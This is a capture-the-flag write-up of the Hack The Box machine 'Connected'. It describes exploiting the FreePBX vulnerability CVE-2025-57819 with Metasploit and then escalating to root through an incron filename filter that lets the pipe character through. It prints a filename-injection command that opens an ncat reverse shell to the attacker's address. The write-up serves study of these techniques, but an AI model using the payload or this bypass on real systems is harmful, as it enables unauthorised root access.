# Connected — HTB Machine

![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)
![Type](https://img.shields.io/badge/Type-Linux%20%2F%20FreePBX-blue)
![Status](https://img.shields.io/badge/Status-Completed-success)

An unauthenticated SQL injection chained into RCE compromises a FreePBX telephony server, and a root-owned event-driven daemon with an incomplete character filter hands over full root.

## Techniques Used

- Nmap port + version scanning
- Web fingerprinting via page footer disclosure
- Metasploit unauthenticated SQLi-to-RCE exploitation (CVE-2025-57819)
- Meterpreter shell stabilization
- Local process/config enumeration
- Incron watch-directory abuse
- Blocklist filter bypass via unfiltered pipe character

## Attack Summary

```text
Nmap --> 22 (ssh), 80 (http), 443 (https)
Web page --> FreePBX 16.0.40.7
CVE-2025-57819 --> Metasploit --> meterpreter (asterisk) --> user.txt
ps aux --> incrond as root, watching writable spool dir
sysadmin_manager filters most chars but not "|"
Crafted filename --> reverse shell as root --> root.txt
```

## Key Vulnerability

**CVE-2025-57819** — An unauthenticated SQL injection in FreePBX bypasses authentication entirely and chains into remote code execution.

**Privilege escalation root cause** — `incrond` runs as root, watching `/var/spool/asterisk/incron/`, a directory writable by the `asterisk` user. The triggered script, `sysadmin_manager`, filters common shell metacharacters but misses the pipe character:

```c
/* Conceptual vulnerable pattern */
char *filtered = strip_chars(filename, "`'\"$><&;");
system_command(hookfile, filtered);   // "|" still passes through
```

## Request Analysis

### Fingerprinting
```text
Footer: "FreePBX 16.0.40.7 is licensed under the GPL"
```

### Incron Configuration
```text
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

## Exploit Payload

**Filename-based pipe injection to trigger a root reverse shell:**
```bash
touch "/var/spool/asterisk/incron/core.logrotate.x|ncat 10.10.17.1 4444 --sh-exec bash"
```

## Why It Works

| Factor | Explanation |
|---|---|
| Unauthenticated SQLi → RCE | No valid credentials needed to gain initial code execution |
| Privileged watcher on writable path | `incrond` runs as root over a directory the compromised user can write to |
| Incomplete blocklist | Filtering blocks common metacharacters but omits the pipe |
| Filename treated as shell input | Attacker-controlled filenames reach a shell-interpreted command |

## References

- CVE-2025-57819 — FreePBX unauthenticated SQL injection to RCE
- incron / inotify-based cron documentation
